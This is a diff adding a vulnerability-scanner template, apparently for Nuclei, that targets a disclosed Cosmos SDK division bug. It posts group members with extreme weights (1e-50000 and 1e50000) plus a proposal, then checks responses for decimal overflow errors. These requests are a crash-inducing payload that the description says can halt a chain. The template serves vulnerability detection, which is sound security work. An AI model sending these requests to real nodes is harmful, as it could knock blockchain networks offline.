@@ -1,0 +1,74 @@
+id: cosmos-sdk-division-bug
+
+info:
+  name: Cosmos SDK Division Bug Exploit
+  author: Muhammad Waseem
+  severity: critical
+  description: |
+    Exploits a division error in Cosmos SDK that can cause chain halt when improperly handling large or small group member weights during policy evaluation.
+    This template is designed to detect the presence of the potential vulnerability by simulating the problematic scenario.
+  reference:
+    - https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-47ww-ff84-4jrg
+    - https://hackerone.com/reports/3018307
+  tags: hackerone,cosmos-sdk, division, bug, high-impact
+variables:
+  weight_small: "1e-50000"
+  weight_large: "1e50000"
+
+http:
+  - raw:
+      - |
+        POST /group/members HTTP/1.1
+        Host: {{BaseURL}}
+        Content-Type: application/json
+
+        {
+          "members": [
+            {
+              "address": "cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0",
+              "weight": "{{weight_small}}"
+            },
+            {
+              "address": "cosmos18v59wacnwz89qphdez62m6nn7qse8mgfr7m0lk",
+              "weight": "{{weight_large}}"
+            }
+          ]
+        }
+
+      - |
+        POST /group/proposals HTTP/1.1
+        Host: {{BaseURL}}
+        Content-Type: application/json
+
+        {
+          "group_policy_address": "cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5",
+          "messages": [
+            {
+              "@type": "/cosmos.bank.v1beta1.MsgSend",
+              "from_address": "cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5",
+              "to_address": "cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0",
+              "amount": [
+                {
+                  "denom": "stake",
+                  "amount": "10"
+                }
+              ]
+            }
+          ],
+          "metadata": "",
+          "title": "Crash Test",
+          "summary": "Testing large and small weights for policy",
+          "proposers": ["cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0"]
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "decimal quotient error"
+        part: body
+
+      - type: word
+        words:
+          - "exponent out of range"
+        part: body
